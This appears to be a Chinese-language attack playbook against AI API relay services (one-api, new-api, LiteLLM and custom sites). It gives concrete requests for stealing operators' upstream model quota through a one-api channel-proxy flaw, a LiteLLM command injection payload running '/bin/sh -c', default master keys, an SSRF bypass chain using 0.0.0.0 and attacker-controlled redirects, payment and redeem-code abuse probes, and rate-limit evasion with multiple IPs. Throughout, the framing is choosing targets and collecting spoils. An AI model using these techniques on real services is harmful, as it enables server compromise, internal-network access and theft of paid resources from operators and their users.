# AI 中转站审计细则（one-api / new-api / LiteLLM / 自研 relay）

## 1. 先拿路由全图，再动手
- 自研站（Next.js）: 从首页 HTML 提 `/_next/static/chunks/*.js` 全量下载，grep `"/api/v1/` 与 `` `"/api/v1/${...}` `` 得到完整 API 表；登录后的页面（/dashboard）chunk 才含资金面路由。
- `buildId` 为空时 `_buildManifest.js` 拿不到，直接从页面 HTML 的 chunk 列表扒，别在 buildManifest 上耗时间。
- 老牌站: `/api/status` 的 `system_name`+`version` 判别家族（One API / New API / 各色 fork 改名）——**改名 fork 版本号仍沿用上游体系**，按版本号匹配 CVE。
- 真 relay 与门户常分域（门户 `hao.ai`，网关 `api.hao.ai`）。门户上 `/v1/models` 返回 Next.js HTML 404 = 打错域，不是没接口。
- **new-api 魔改版识别**：响应头带 `x-new-api-version`（魔改版常改 v0.0.0 掩盖真实版本）+ `x-oneapi-request-id`。
- **new-api 认证**：登录 `POST /api/user/login {username,password}` → gorilla session cookie（set-cookie: session=…，Max-Age 30 天）；后续 API 需 `Cookie: session` + `New-Api-User: <id>` header，**header 必须匹配 session 登录用户**（不匹配报 `New-Api-User does not match logged in user`，IDOR 全拦）；或用 access token `Authorization: Bearer <key>`。注册默认开邮箱验证。

## 2. 资金面端点清单与逐项判死（自研站典型）
| 端点 | 测法 | 典型结果 |
|---|---|---|
| /wallet | GET | 全 0 字段即知无余额，别缠 |
| /wallet/promo | POST {code} | 常见码全 404 invalid promo code |
| /redeem | POST {code} | min 3 字符；**失败 5 次锁 15 分钟**（retryAfterSeconds 900）→ 爆不破 |
| /payment/orders | POST {amount} | amount 严格 >0 且 <=global_max；负数/0/超大全 400 |
| /payment/orders/verify | POST {order_id} | **只查询不回写**；注入 status/paid/credits/amount 均无效 |
| /user/aff/transfer | POST {amount} | 无累计返利时 404/空，需先有 earnedAmount |
| /referral/agent/payout-requests | POST | isAgent=false 时不可达 |
| /user/aff | GET | 泄露 aff_code + 返利比例（情报，不是肉） |

## 3. keys 与渠道
- 建 key 的响应可能**服务端直接掩码**（`prefix:"***"`, `key:"sk-hao...xxxx"`）——这类站没有 reveal 端点，401 的报错会告诉你真实格式（如 `expected sk-haoai-...`）。拿不到明文 key 就无法打 relay，直接判死，别死磕 reveal 变体。
- `routing.channel` 字段会泄露渠道 UUID/displayName/accessKind（信息泄露级，非越权）：拿 UUID 去 `/api/v1/channels/{id}` 多半 404——渠道是按账号 scope 查的。
- keys 的 PATCH 常是白名单 `{name, enabled, status}`，改 routing/budget 一律 400。
- **new-api token 创建后需设置 group 才能调 API**：不带 group 创建会报 `请设置 KEY 分组后使用`；创建时传 `group` 字段，值从 `GET /api/user/self/groups` 拿（泄露各分组 label/ratio/discount/desc，含进货价 vendor_discounts）。
- **new-api 余额检查是全局的**：quota 0 拦所有调用，免费分组（ratio 0，如 deepseek-free）也过不了 `insufficient_user_quota`——余额检查在分组路由之前，免费分组只让"有余额"的用户免扣，不是零余额也能白嫖。

## 4. 81027（one-api channelid 固定）利用要点
- 路由 `/v1/oneapi/proxy/{cid}/*target`，**target 必须有值**（`chat/completions`）。
- 普通 token 即可（path-param 分支零角色校验，master 代码仍未修）。
- 判定：`200` 且响应含 `"content"` = 真调用成功（嫖的是运营者 provider 额度）；`400 无效的渠道 Id` = cid 不存在；`500 do request failed`/`unexpected end of JSON` = 渠道在但上游失败（key 失效/内网不通/模型不对）。
- 先看模型档次再铺量：白嫖池多是 gpt-4o 老一代，按"战果口味"筛掉。

## 5. LiteLLM 42271（MCP stdio 命令注入）
- `POST /mcp-rest/test/connection {"command":"/bin/sh","args":["-c",cmd],"transport":"stdio","server_name":"x","alias":"x"}`
- 宽松实现（1.83.x 部分部署）：响应直接带 `stdout`/`stderr`/`pid`。
- 严格实现（1.82.x）：返回 `Failed to connect to MCP server`，**命令已执行但无回显**——用时间侧信道（`true` vs `sleep 7`）证明，别误判为没打通。
- 认证挡（401）时试 `master key`：`sk-1234`/`sk-litellm` 命中率不低（大批实例），命中后 `/model/info`、`/key/list`、`/spend/logs` 全通；但多数站 `api_base` 指向 `localhost:11434`（ollama），**没有上游真 key**，价值低。
- `/ui` 登录端点（POST /login）活但 401 时不要爆太久，默认凭据多为自定义。

## 6. 接码登录工作流（目标站邮箱白名单站）
- `POST /api/v1/auth/email/start {"email"}` → `{"challenge_id","expires_in":600,"existing_account":true}`；`POST /api/v1/auth/email/verify {"challenge_id","code"}` → 返回 user + `Set-Cookie: <session>`。
- 域名白名单常见只放 gmail/qq/163/outlook——moakt/mail.tm 会被拒（`email domain is not allowed`）。此时走用户真实邮箱：**发码用舰队 IP（绕过本机限速），让用户报验证码**。
- challenge_id 与 session 跨 IP 有效；限速是按源 IP 的。

## 7. 专业级防守站的判死清单
以下同时出现即判死换目标：key 服务端掩码且无 reveal；支付 verify 只查不回写；兑换码失败锁 10 分钟以上；PATCH/创建接口全字段白名单；usage 按 session scope（传 user_id 被忽略）；核心路径有 CDN/WAF 403。

## 8. new-api SSRF 漏洞链（root 点方向）
- 触发：`POST /v1/chat/completions` 的 `messages[].content[].image_url.url`（多模态图片 URL），需 `stream:true`（`GET_MEDIA_TOKEN_NOT_STREAM=false` 时非流式不走 fetch）。
- **URL fetch 发生在余额检查之前**：quota 0 照样触发，返回 `count_token_failed` 而非 `insufficient_user_quota`——SSRF 不需要余额，普通 token 即用。
- CVE 链：59146（<0.9.0.5 原始认证 SSRF）、62155（<0.9.6 302 重定向绕过）、GHSA-v5c3-6wvc-pc2q（<=0.11.9 用 `0.0.0.0` 绕过 isPrivateIP）。
- 测试判据（先对照后实验）：`http://127.0.0.1:8080/` → 报 `private IP address not allowed` = 过滤器生效；`http://0.0.0.0:8080/` → 报 `connection refused` = 绕过成功（服务器真发了 TCP）。
- 新版过滤器检查项（全修后逐一验）：私网 IP(127/0.0.0.0/::1/::ffff:127.0.0.1)、端口白名单(默认 80/443/8080/8443，Redis 6379/MySQL 3306 打不到)、DNS rebinding(域名解析后查 IP，nip.io 也拦)、302 重定向目标、@ 混淆。
- Go net 库不认十进制/十六进制/八进制/短地址 IP（`2130706433`/`0x7f000001`/`127.1`），全报 `DNS resolution failed`，别在这类形式浪费时间。
- 302 重定向绕过测试：攻击者服务器 8080 起 `redirect(..., 302)`，image_url 指向公网服务器，看 302 后目标是否还被拦（新版拦，报 `redirect to … blocked: private IP … not allowed`）。
- 判死：`0.0.0.0` + 302 + IPv6 + DNS rebinding 全拦 = SSRF 已修，root 点当前版本死；但把"fetch 在余额前"这个事实记进情报卡，等 new-api 出新 SSRF 绕过 CVE 第一时间回来复验。
